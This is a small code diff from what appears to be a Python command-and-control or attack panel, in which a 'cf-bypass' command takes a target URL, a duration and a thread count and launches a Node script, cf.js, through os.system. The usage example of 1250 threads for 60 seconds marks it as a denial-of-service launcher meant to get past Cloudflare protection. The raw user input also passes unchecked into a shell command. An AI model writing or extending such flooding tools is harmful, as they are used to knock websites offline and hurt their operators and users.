@@ -364,7 +364,7 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
-                os.system(f'node  {url} {time} {thread}')
+                os.system(f'node cf.js {url} {time} {thread}')
             except IndexError:
                 print('Usage: cf-bypass <url> <time> <threads>')
                 print('Example: cf-bypass http://example.com 60 1250')
